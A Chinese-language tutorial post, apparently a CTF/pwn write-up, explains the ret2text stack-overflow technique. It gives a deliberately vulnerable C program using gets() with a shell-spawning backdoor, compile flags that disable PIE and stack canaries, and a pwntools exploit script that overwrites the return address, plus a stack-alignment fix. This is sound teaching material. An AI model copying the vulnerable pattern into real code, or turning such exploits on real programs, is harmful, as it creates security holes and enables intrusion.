---
title: ret2text
date: 2026-01-22 17:05:40
tags: 
  - Pwn
---

ret2text (Return to Text) 是 Pwn 中最基础、最简单的一种栈溢出攻击技术。

顾名思义，它的核心含义是：控制程序的返回地址（Return Address），让它跳转到程序代码段（.text 段）中已有的、我们期望执行的代码位置。

### ret2text 的核心原理
程序本身包含了一个后门函数（比如直接打印 flag 或执行 `system("/bin/sh")`）或者一段有用的代码片段。

我们通过输入超长的数据，覆盖掉栈上的返回地址。

我们将返回地址修改为后门函数的地址。

当当前函数执行 `ret` 指令时，CPU 就会“乖乖地”跳转到后门函数去执行，而不是返回原来的调用者。

#### 适用条件

存在栈溢出漏洞。

程序中存在可利用的后门函数或代码片段。

通常要求关闭 PIE (地址随机化)：如果不关闭 PIE，代码段的地址每次运行都会变，我们就不知道后门函数在哪了（除非先泄露地址）。

可以开启 NX (堆栈不可执行)：因为 ret2text 是跳转到已有的代码段去执行，而不是在栈上执行我们写入的 shellcode，所以它不怕 NX 保护。

### 一个典型的 ret2text 例子
#### (1) 漏洞源码 (C语言)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// 这是一个后门函数，正常逻辑下永远不会被调用
void backdoor() {
    puts("Success! Here is your shell.");
    system("/bin/sh");
}

void vuln() {
    char buffer[20];
    puts("Input something:");
    // 漏洞点：gets 不检查长度，导致溢出
    gets(buffer); 
}

int main() {
    vuln();
    return 0;
}
```

**编译命令**（为了演示方便，我们关闭 PIE 和 Canary）：

```bash
gcc -no-pie -fno-stack-protector -o pwn_me source.c
```

#### (2) 攻击分析

第一步：确定溢出偏移 (Offset)
我们需要知道输入多少个垃圾字符后，才能刚好碰到“返回地址”。

`buffer` 大小是 20 字节。
在 64 位系统中，通常栈布局是：`[buffer] + [saved_rbp (8字节)] + [return_address (8字节)]`。
虽然 buffer 申明是 20，但编译器可能会对齐（比如给 24 或 32 字节）。
假设通过调试（如使用 gdb 或 `cyclic`）发现，偏移量是 32 字节后紧接着就是返回地址。

第二步：找到后门地址 (Address)
因为关闭了 PIE，函数的地址是固定的。我们可以用 `objdump` 或 IDA 查看 `backdoor` 函数的地址。

```bash
objdump -d pwn_me | grep backdoor
# 输出示例：
# 0000000000401176 <backdoor>:
```

这里 `0x401176` 就是我们的目标地址。

#### (3) 构造 Payload

Payload 的结构如下：
`[ 'A' * 偏移量 ] + [ backdoor_addr ]`

填充：32 个 'A' (覆盖 buffer 和 old ebp)
返回地址：`0x401176` (覆盖原本的 return address)

#### (4) Exploit 脚本 (Pwntools)

```python
from pwn import *

# 1. 设置目标
context(os='linux', arch='amd64', log_level='debug')
p = process('./pwn_me')
elf = ELF('./pwn_me')

# 2. 获取相关信息
# 如果是自动获取后门地址
backdoor_addr = elf.symbols['backdoor']
log.success(f"Backdoor Address: {hex(backdoor_addr)}")

# 3. 构造 Payload
# 偏移量是 32 (假设通过调试得出的)
offset = 32

# p64() 用于将整数打包成 64位的二进制地址 (小端序)
# 相当于把 0x401176 变成 b'\x76\x11\x40\x00\x00\x00\x00\x00'
payload = flat([
    b'A' * offset,
    backdoor_addr
])

# 4. 发送 Payload
p.recvuntil("Input something:\n")
p.sendline(payload)

# 5. 获取交互 Shell
p.interactive()
```

### 常见问题：Stack Alignment (栈对齐)

在 64 位系统（尤其是 Ubuntu 18.04+）中，可能会遇到一个坑：脚本写得对，地址也对，但程序跳转到 `system` 时崩溃了。

原因：CPU 的 SIMD 指令集（如 `movaps`）要求栈指针 `rsp` 必须是 16 字节对齐的（以 0 结尾）。

解决方法：
在跳转到 `backdoor` 之前，先跳到一个 `ret` 指令（`ret` gadget）。
`ret` 指令的作用相当于 `pop rip`，它会让栈指针移动 8 字节，从而再次把栈对齐。

修正后的 Payload：

```python
ret_addr = 0x40101a # 用 ROPgadget 找一个 ret 指令的地址
payload = flat([
    b'A' * offset,
    ret_addr,       # 先跳这里，对齐栈
    backdoor_addr   # 再跳后门
])
```
